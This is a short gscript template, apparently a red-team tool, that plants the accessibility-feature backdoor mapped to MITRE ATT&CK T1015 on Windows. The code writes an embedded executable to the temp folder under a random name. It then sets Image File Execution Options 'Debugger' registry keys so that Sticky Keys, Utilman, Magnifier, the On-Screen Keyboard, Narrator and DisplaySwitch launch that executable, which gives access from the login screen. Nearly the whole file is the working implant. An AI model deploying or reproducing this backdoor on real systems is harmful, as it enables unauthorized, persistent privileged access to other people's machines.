// Example gscript template
// Title: Enable Sticky Keys
// Author: ahhh
// Purpose: Enables a bunch of sticky keys like accessability options with a backdoor on Windows
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1015

//priority:110
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

//import:/private/tmp/example.exe

function Deploy() {
    console.log("Starting Enable Sticky Keys");

    // Prep the sample
    var example = GetAssetAsBytes("example.exe");
    var temppath = os.TempDir();  
    var naming = G.rand.GetAlphaString(5);
    naming = naming.toLowerCase();
    var fullpath = temppath+"\\"+naming+".exe";

    // Drop the sample
    console.log("file name: "+ fullpath);
    errors = G.file.WriteFileFromBytes(fullpath, example[0]);
    console.log("errors: "+errors);

    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", "Debugger", fullpath);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe", "Debugger", fullpath);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe", "Debugger", fullpath);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnifier.exe", "Debugger", fullpath);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\OSK.exe", "Debugger", fullpath);
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe", "Debugger", fullpath);

    console.log("Done Enable Sticky Keys");
    return true;
  }
  